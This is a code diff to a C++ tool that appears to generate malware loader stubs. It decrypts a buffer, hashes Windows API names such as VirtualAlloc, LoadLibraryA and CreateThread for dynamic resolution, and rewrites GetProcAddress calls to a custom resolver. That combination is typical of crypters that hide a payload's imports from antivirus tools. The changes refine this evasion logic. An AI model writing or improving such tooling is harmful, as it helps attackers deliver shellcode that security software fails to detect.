@@ -177,7 +177,7 @@ vector<unsigned char> decrypt(const vector<unsigned char> &buf, const vector<uns
 
 void replaceAPICalls(string &line, const map<string, string> &replacements) {
     for (const auto &pair : replacements) {
-        regex apiRegex("\\b" + pair.first + "\\b");
+        regex apiRegex(pair.first);  // Removed \b for multi-word replacements
         line = regex_replace(line, apiRegex, pair.second);
     }
 }
@@ -242,20 +242,17 @@ void writeStub(bool *flags, string &stub_name, string &stubTemplatePath, string 
 
         const char *funNames[] = {
             "VirtualAlloc",
-            "VirtualFree",
             "LoadLibraryA",
-            "CreateThread",
-            "WaitForSingleObject",
-            "CloseHandle"
+            "CreateThread"
         };
 
         vector<DWORD> hashes;
-        for(int i=0; i<6; i++){
+        for(int i=0; i<3; i++){
             hashes.push_back(getHashFromString(funNames[i]));
         }
 
         // Create a string representation of the DWORD array
-        dwordArray = "DWORD fun[] = {";
+        dwordArray = "DWORD hashes[] = {";
         for (size_t i = 0; i < hashes.size(); ++i) {
             dwordArray += "(DWORD)" + std::to_string(hashes[i]);
             if (i < hashes.size() - 1) {
@@ -264,9 +261,12 @@ void writeStub(bool *flags, string &stub_name, string &stubTemplatePath, string 
         }
         dwordArray += "};";
 
-        size_t pos = DYN_GLOBALS.find("/*DWORD_ARRAY_PLACEHOLDER*/");
+        size_t pos = DYN_CALL.find("/*DWORD_ARRAY_PLACEHOLDER*/");
         if (pos != std::string::npos) {
-            DYN_GLOBALS.replace(pos, strlen("/*DWORD_ARRAY_PLACEHOLDER*/"), dwordArray);
+            DYN_CALL.replace(pos, strlen("/*DWORD_ARRAY_PLACEHOLDER*/"), dwordArray);
+        } else {
+            cerr << "Couldnt find /*DWORD_ARRAY_PLACEHOLDER*/" << endl;
+            exit(1);
         }
     }
 
@@ -319,23 +319,13 @@ void writeStub(bool *flags, string &stub_name, string &stubTemplatePath, string 
         if (placeholders[API_CALLS_POS] == true) {
             map<string, string> replacements = {
                 {"VirtualAlloc", "pVirtualAlloc"},
-                {"VirtualFree", "pVirtualFree"},
                 {"LoadLibraryA", "pLoadLibraryA"},
                 {"CreateThread", "pCreateThread"},
-                {"WaitForSingleObject", "pWaitForSingleObject"},
-                {"CloseHandle", "pCloseHandle"}
+                {"FARPROC\\s+func\\s*=\\s*GetProcAddress\\s*\\(\\s*module\\s*,\\s*import->Name\\s*\\);", 
+                 "void* func = resolveAddr(module, import->Name, 0);"}
             };
 
-            map<string, string> hashReplacements = {
-                {"VirtualAlloc", "VA"},
-                {"VirtualFree", "VF"},
-                {"LoadLibraryA", "LLA"},
-                {"CreateThread", "CT"},
-                {"WaitForSingleObject", "WFO"},
-                {"CloseHandle", "CH"}
-            };
-
-            replaceAPICalls(line, hashReplacements);
+            replaceAPICalls(line, replacements);
             // Since every line has to be checked this has to stay false 
             //placeholders[API_CALLS_POS] = false;
         }
